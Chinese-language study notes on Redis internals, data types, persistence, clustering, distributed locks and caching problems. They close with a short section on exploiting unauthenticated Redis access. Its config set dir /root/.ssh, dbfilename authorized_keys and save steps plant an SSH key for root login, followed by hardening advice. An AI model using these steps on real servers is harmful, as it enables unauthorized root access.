# Redis实战
1. worker是单线程的，保证业务安全，还有fork，IO Threads，持久化等线程
2. select、poll,*epoll[【并发】IO多路复用select/poll/epoll介绍](https://www.bilibili.com/video/BV1qJ411w7du)
3. redis的IO多路复用
 - 同步非阻塞，同步读取，串行化处理
 - IO多路复用器：更有效地获取可读写的连接
 - 第一步：获取可读写连接，第二步，业务处理，第三步，返回结果，第四步，处理下一个连接
 - 串行化处理，单线程下更快了，不需要上下文切换、加锁、cas之类
4. redis6：IO Threads,将获取连接，返回结果等任务交给IO Threads，计算业务交给单线程的worker线程
## 5大value使用场景
1. string
 - string：字符串，数值，bitmap。
 - 二进制安全：redis，hbase，kafka。。。data->byte[]->直接存储
 - 不能incr字符
 - 字符串：缓存data
 - 数值：统计、限流、秒杀、抢购
 - bitmap：二进制存储。自动扩容，向后拉长。从开始设置offset处0/1。可以位运算。BITOP [and/or] [新key] [已存在的bit key..]。
 - bitmap：统计用户活跃天数，统计某时间窗口活跃用户数。进行数据分析
2. list
 - 双向链表，有序，且每个节点都持有head、end。lpush/rpush,lpop/rpop
 - 实现栈、队列、数组
 - LTRIM：截取一段。可用于评论列表，缓冲数据
3. hash
 - hset sean name zzzl,hset sean age 18,hget,hgetall,hkeys,hvals
 - 也支持数值计算：hincr sean age -1
 - 用于详情页：存储用户数据，商品数据详情页
 - 用于统计值：粉丝数、点赞数。。。
4. set
 - 不可重复无序集合
 - SRANDMEMBER：随机返回一定数量集合。参数 负数 可能重复的集合，正数 不重复集合，大于length正数 所以元素集合，大于length负数 有重复的所有元素集合
 - spop：随机弹出一个元素，直到所有元素弹出过一遍。用于抽奖
 - 集合操作：可用于好友列表，共同好友。推荐好友/商品。实现推荐系统
5. zset(sorted_set)
 - 不可重复有序集合，按分值排序，设置正反排序
 - score：分值 都为1，以首字母排序
 - rank：排名
 - 排行榜，分页
 - 如何排序：ziplist，>128个元素或单元素>=64字节转为skiplist
 - 跳跃表：多层链表，O接近红黑树，默认共64层
 - 插入流程：1.插入底层，2.找到上一层，插入，3.直到该节点的最高层层。能有几层，循环随机抛硬币，决定最高能插入第几层，越高可能性越低
 - [什么是跳表](https://blog.csdn.net/yjw123456/article/details/105159817)
 - [zset命令](https://blog.csdn.net/u010900754/article/details/94978144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158557774519726869012574%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&request_id=158557774519726869012574&biz_id=0&utm_source=distribute.pc_search_result.none-task)

## 持久化
1. 因为跑着内存中，容易挂机
2. 做缓存，挂机降低效率，打到数据库
3. 通用知识点：
 - 持久化方案：
 - 快照（时间窗口，全量，加载快，rdb，丢失大量时间数据）、
 - 日志（倾向实时，记录完整，操追加到日志文件，aof，加载慢，拉低redis性能，有冗余，进行重写）
4. redis4默认rdb，可以开启aof
5. 新版本，开启混合模式，aof文件。先拍快照（二进制的rdb文件数据写入aof日志文件中），之后追加aof日志
## 大并发
1. redis单实例问题：单点故障、性能瓶颈（压力大）
 - 主备集群，1对多，多实例，全量同步，最好链式
 - 分片集群，多实例，分而治之
 - redis单实例：在同一物理主机中，可以有50000QPS
 - 百万并发：

## cap
1. 同步问题：强一致性破坏可用性。弱一致性没有数据一致性保障
2. redis默认弱一致。（高版本可以配置强一致）
3. 最终一致性：将消息存入绝对可靠黑盒件（HDFS），从机从中获取消息。
 - 过半存在：最终一致->paxos 
 - 不过半：脑裂
 - 全部：强一致

## 分布式锁
1. 奇数redis集群，client必须抢到过半实例锁，才能算得到锁。redlock算法
2. 还有锁过期时间需要维护
3. 还是用zookeeper吧
## redis使用
1. 将微服务的数据迁入redis，服务无状态。session，集合数据。。。集群不需要同步了
2. 多实例，akf拆分
3. akf：1、按业务拆分到不同redis中，2、主备复制高可用，3、分片集群。三个维度


## redis小知识
5. 使用nc连接redis-server： nc localhost 6379,使用exec：
 - help @string
 - redis中bit映射被限制在512MB之内，所以最大是2^32位。
 - aof日志在单线程，安全
 - redis-benchmark:压测，网络IO对QPS限制极大
 - 官方推荐：redis在物理机，千兆万兆网卡
 - cluster，hash桶减少IO瓶颈
 - 串行化，计算向数据移动
 - redis-cli --intrinsic-latency 120   可以监测redis的最大延迟，120为120秒内，一般够用。注意要在redis本机服务器上使用，否则得考虑到网络延迟的问题。

## 缓存穿透
1. 缓存穿透无法避免，但可以避免高频穿透。
2. 不断请求不存在的数据，出现缓存穿透
 - 将这个不存在的数据在redis缓存一份（设置存在时间短一点），将在redis拦截这个请求。
 - 使用UUID之类的请求，会使redis缓存大量null数据，真正的热点数据被淘汰
 - 使用过滤器，过滤请求
 - 多种字段请求，导致过滤器内存紧张
 - 使用布隆过滤器
3. 布隆算法
 - 通过一定错误率换取空间
 - 通过bit数组来标识数据
 - 使用hash函数，会碰撞，导致错误率
 - 增加bit数组长度，使用多个hash函数，降低碰撞概率
 - hash函数的个数要与bit数组长度相匹配
 - 错误率：通过布隆算法，数据不一定存在，通不过布隆算法，数据一定不存在

## 缓存雪崩
1. 缓存层缓存的多条数据，在某一时间突然失效，导致大量请求打向mysql数据库
 - 可能redis缓存的数据的有效期一致，同时失效
 - 解决：数据有效期随机
 - redis数据库宕机
 - 解决：搞集群，多层缓存

## 缓存击穿
1. redis中一条及其热门的数据失效，导致大量请求打向mysql数据库，一般公司不需要解决
2. 解决：使用分布式锁

## 分布式锁
1. 使用环境：共享资源，多任务环境，共享资源互斥。需要上锁。（多线程争抢不可以同时使用的同一个资源）
2. 使用mysql锁，死锁问题
3. 可以加一个监视进程，设置锁timeout
4. timeout设置长度是问题，太短可能发生资源并发问题，太长效率可能发生问题，所以一般不用
5. 使用zookeeper实现分布式锁
6. zookeeper:分布式一致性服务协调框架，弱一致性。可以使用同步命令达成最终一致性。
7. 文件系统与事件通知机制
8. 内部维护一个全局有序唯一序号
9. 创建有序临时节点，查看自己是否是序号最小的临时节点，则获取到锁

## cluster hash一致性算法
1. 一致性需要进行hash取模，对扩展不友好
2. 使用hash环，cluster有16384个slot（虚拟节点、hash槽）
3. 将slot映射给不同的redis节点
4. 数据key取模
5. 数据按顺时针存储到对应slot的节点上
6. redis节点扩展只需要迁移两个节点的数据
7. 弊端：会发生数据倾斜

## redis安装
1. linux需要gcc：yum -y install gcc gcc-c++ kernel-devel
2. 下载redis源码包：redis-5.0.10.tar
3. 解压
4. 进入redis目录
5. 执行 make && make install
6. 如果发生： jemalloc/jemalloc.h: No such file or directory。可能是因为我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。
7. 执行： make distclean  && make  清理残留的文件

## 利用redis-cli攻击服务器
[Redis 未授权访问漏洞深度利用](https://blog.csdn.net/qq_27446553/article/details/78096385)
### 利用漏洞ssh免密连接
1. redis-cli连接到服务器的redis
2. 查看redis的信息：info server
3. 查看redis所有配置：config get *
4. 修改redis工作目录：config set dir /root/.ssh
5. 修改redis数据存储目录：config set dbfliename authorized_keys
6. 将ssh的公钥放入authorized_keys文件：set 0 '\n\n\n公钥\n\n\n'
7. 保存：save
8. 回复redis原本配置
9. 这个方法利用redis的无授权访问漏洞，凭借这个方法可以写linux上的所有文件，但是无法读。
10. 也可以借此修改服务器的root密码
11. 所以要做好安全防护，如：开启redis的保护模式，设置密码，限制访问ip。linux禁止root登陆，管理员锁定账号等等。